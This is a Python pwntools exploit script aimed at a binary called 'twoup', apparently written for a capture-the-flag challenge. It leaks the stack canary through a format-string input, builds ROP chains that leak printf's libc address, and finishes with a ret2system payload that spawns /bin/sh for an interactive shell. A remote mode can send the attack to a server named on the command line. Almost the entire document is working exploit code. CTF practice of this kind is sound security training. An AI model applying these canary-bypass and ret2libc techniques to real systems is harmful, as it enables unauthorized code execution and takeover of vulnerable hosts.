from pwn import *
import sys

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './twoup'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

def breakpoint_handler(signal, frame):
    print("Breakpoint reached")
    # You can add additional actions here if needed
    pass

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 15  # Canary offset

# Lib-C library
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

pop_rdi = 0x004013fb  # Found with ropper
ret = 0x00401016  # Found with ropper

# Send payload 1
log.info(f'Sending payload 1')
io.sendlineafter(b'Bet:', b'%9$p')
sleep(0.5)
# Canary value
reply1 = io.recvuntil(b'Your bet:')
print("Reply 1 is: ",reply1)
leaked_addresses = io.recvlineS().split("\n")[0]
print("Leaked addresses: ",leaked_addresses)
canary = int(leaked_addresses, 16)
log.info(f'Canary: {hex(canary)}')

# Build payload 2 (leak printf)
payload = flat([
    offset * b'A',  # Pad to canary (15)
    canary, # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Leak got.puts
    pop_rdi,
    elf.got.printf,
    elf.plt.printf,
    0x00401319
])
# Send payload 2
io.recvuntil(b'You lose')
io.sendlineafter(b'Bet:', payload)
sleep(0.5)
io.recvuntil(b'You lose')
io.recvline()
# Retrieve got.printf address
got_printf = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info(f"leaked got_printf: {got_printf:#x}")
libc.address = got_printf - libc.symbols.printf
info(f"libc_base: {libc.address:#x}")

# Build payload 3 (ret2system)
payload = flat([
    offset * b'A',  # Pad to canary (15)
    canary, # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Ret2system
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret, # Stack alignment
    libc.symbols.system
])

# Send payload 3
io.recvuntil(b'You lose')
io.sendlineafter(b'Bet:',payload)

# Get our flag/shell
io.interactive()
